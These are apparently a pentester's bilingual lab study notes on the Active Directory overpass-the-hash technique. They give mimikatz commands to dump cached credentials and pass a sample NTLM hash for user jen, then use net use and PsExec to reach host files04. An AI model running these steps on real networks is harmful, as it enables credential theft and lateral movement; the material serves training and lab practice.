
## DESCRIPTION

With overpass the hash,1 we can "over" abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT). Then we can use the TGT to obtain a Ticket Granting Service (TGS).

To demonstrate this, let's assume we have compromised a workstation (or server) that jen has authenticated to. We'll also assume that the machine is now caching their credentials (and therefore, their NTLM password hash).


#### Mas información
* 


## EXPLOITATION

Necesitamos un hash NTLM
```
privilege::debug

sekurlsa::logonpasswords
```


Desde mimikatz ejecutamos:

```
sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```



**!!NOTA IMPORTANTE!!** 

No Kerberos tickets have been cached, but this is expected since jen has not yet performed an interactive login. Let's generate a TGT by authenticating to a network share on the files04 server with net use.

We used net use arbitrarily in this example, but we could have used any command that requires domain permissions and would subsequently create a TGS.



Por ultimo cuando tengamos el TGT podemos conectarnos a la máquina como el otro usuario:

```
cd C:\tools\SysinternalsSuite\
.\PsExec.exe \\files04 cmd
```
## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 